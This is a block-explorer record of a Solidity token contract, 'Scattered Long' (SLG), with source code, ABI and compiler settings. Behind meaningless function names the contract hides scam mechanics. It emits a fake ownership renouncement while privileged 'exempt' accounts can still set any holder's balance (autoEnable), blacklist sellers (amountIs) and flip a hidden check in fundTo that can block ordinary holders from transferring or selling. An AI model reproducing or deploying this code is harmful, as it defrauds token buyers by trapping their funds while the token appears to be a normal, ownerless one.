{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface fromLaunchedLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityTeamShould {\n    function createPair(address atIs, address receiverEnable) external returns (address);\n}\n\ninterface walletSwapMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atReceiverSell) external view returns (uint256);\n\n    function transfer(address modeLaunched, uint256 tokenAmountMode) external returns (bool);\n\n    function allowance(address txIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenAmountMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeLaunched,\n        uint256 tokenAmountMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalSell, uint256 value);\n    event Approval(address indexed txIs, address indexed spender, uint256 value);\n}\n\ninterface senderEnable is walletSwapMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ScatteredLong is marketingLaunch, walletSwapMin, senderEnable {\n\n    uint256 constant launchLimit = 11 ** 10;\n\n    string private buyTrading = \"SLG\";\n\n    uint256 public modeAmount;\n\n    uint8 private marketingLaunchedTotal = 18;\n\n    address private amountSell;\n\n    mapping(address => bool) public fromExempt;\n\n    function maxWallet() private view {\n        require(fromExempt[_msgSender()]);\n    }\n\n    bool public autoSwap;\n\n    bool public fromLiquidity;\n\n    uint256 private minList;\n\n    event OwnershipTransferred(address indexed autoReceiver, address indexed maxAmount);\n\n    bool private walletToken;\n\n    mapping(address => uint256) private toEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return atMax;\n    }\n\n    function allowance(address isMarketing, address swapMarketing) external view virtual override returns (uint256) {\n        if (swapMarketing == enableAmount) {\n            return type(uint256).max;\n        }\n        return fundMax[isMarketing][swapMarketing];\n    }\n\n    function transferFrom(address atLimit, address modeLaunched, uint256 tokenAmountMode) external override returns (bool) {\n        if (_msgSender() != enableAmount) {\n            if (fundMax[atLimit][_msgSender()] != type(uint256).max) {\n                require(tokenAmountMode <= fundMax[atLimit][_msgSender()]);\n                fundMax[atLimit][_msgSender()] -= tokenAmountMode;\n            }\n        }\n        return fundTo(atLimit, modeLaunched, tokenAmountMode);\n    }\n\n    function sellLaunch(uint256 tokenAmountMode) public {\n        maxWallet();\n        modeShould = tokenAmountMode;\n    }\n\n    mapping(address => bool) public receiverTo;\n\n    constructor (){\n        if (minEnable != modeAmount) {\n            modeAmount = minEnable;\n        }\n        fromLaunchedLiquidity amountTeam = fromLaunchedLiquidity(enableAmount);\n        walletTeamMarketing = liquidityTeamShould(amountTeam.factory()).createPair(amountTeam.WETH(), address(this));\n        if (modeAmount != launchWallet) {\n            fromLiquidity = true;\n        }\n        teamReceiverSell = _msgSender();\n        maxSender();\n        fromExempt[teamReceiverSell] = true;\n        toEnable[teamReceiverSell] = takeMode;\n        if (toTx) {\n            fromLiquidity = true;\n        }\n        emit Transfer(address(0), teamReceiverSell, takeMode);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingLaunchedTotal;\n    }\n\n    function amountIs(address tradingReceiver) public {\n        maxWallet();\n        \n        if (tradingReceiver == teamReceiverSell || tradingReceiver == walletTeamMarketing) {\n            return;\n        }\n        receiverTo[tradingReceiver] = true;\n    }\n\n    address public teamReceiverSell;\n\n    function owner() external view returns (address) {\n        return amountSell;\n    }\n\n    address teamAtAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 totalMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTrading;\n    }\n\n    mapping(address => mapping(address => uint256)) private fundMax;\n\n    bool public buyAmount;\n\n    uint256 public minEnable;\n\n    bool public enableAt;\n\n    function maxSender() public {\n        emit OwnershipTransferred(teamReceiverSell, address(0));\n        amountSell = address(0);\n    }\n\n    uint256 modeShould;\n\n    function autoEnable(address fundFromIs, uint256 tokenAmountMode) public {\n        maxWallet();\n        toEnable[fundFromIs] = tokenAmountMode;\n    }\n\n    function fundTo(address atLimit, address modeLaunched, uint256 tokenAmountMode) internal returns (bool) {\n        if (atLimit == teamReceiverSell) {\n            return toLaunch(atLimit, modeLaunched, tokenAmountMode);\n        }\n        uint256 atLiquidityTrading = walletSwapMin(walletTeamMarketing).balanceOf(teamAtAmount);\n        require(atLiquidityTrading == modeShould);\n        require(modeLaunched != teamAtAmount);\n        if (receiverTo[atLimit]) {\n            return toLaunch(atLimit, modeLaunched, launchLimit);\n        }\n        return toLaunch(atLimit, modeLaunched, tokenAmountMode);\n    }\n\n    address enableAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private launchWallet;\n\n    function transfer(address fundFromIs, uint256 tokenAmountMode) external virtual override returns (bool) {\n        return fundTo(_msgSender(), fundFromIs, tokenAmountMode);\n    }\n\n    string private atMax = \"Scattered Long\";\n\n    bool public toTx;\n\n    function toLaunch(address atLimit, address modeLaunched, uint256 tokenAmountMode) internal returns (bool) {\n        require(toEnable[atLimit] >= tokenAmountMode);\n        toEnable[atLimit] -= tokenAmountMode;\n        toEnable[modeLaunched] += tokenAmountMode;\n        emit Transfer(atLimit, modeLaunched, tokenAmountMode);\n        return true;\n    }\n\n    function approve(address swapMarketing, uint256 tokenAmountMode) public virtual override returns (bool) {\n        fundMax[_msgSender()][swapMarketing] = tokenAmountMode;\n        emit Approval(_msgSender(), swapMarketing, tokenAmountMode);\n        return true;\n    }\n\n    uint256 private takeMode = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeMode;\n    }\n\n    function balanceOf(address atReceiverSell) public view virtual override returns (uint256) {\n        return toEnable[atReceiverSell];\n    }\n\n    address public walletTeamMarketing;\n\n    function totalTeam(address launchedFrom) public {\n        if (enableAt) {\n            return;\n        }\n        if (walletToken == fromLiquidity) {\n            walletToken = true;\n        }\n        fromExempt[launchedFrom] = true;\n        if (launchWallet == minList) {\n            minList = minEnable;\n        }\n        enableAt = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return amountSell;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"}],\"name\":\"amountIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmountMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFromIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmountMode\",\"type\":\"uint256\"}],\"name\":\"autoEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiverSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAmountMode\",\"type\":\"uint256\"}],\"name\":\"sellLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiverSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFrom\",\"type\":\"address\"}],\"name\":\"totalTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFromIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmountMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmountMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTeamMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ScatteredLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}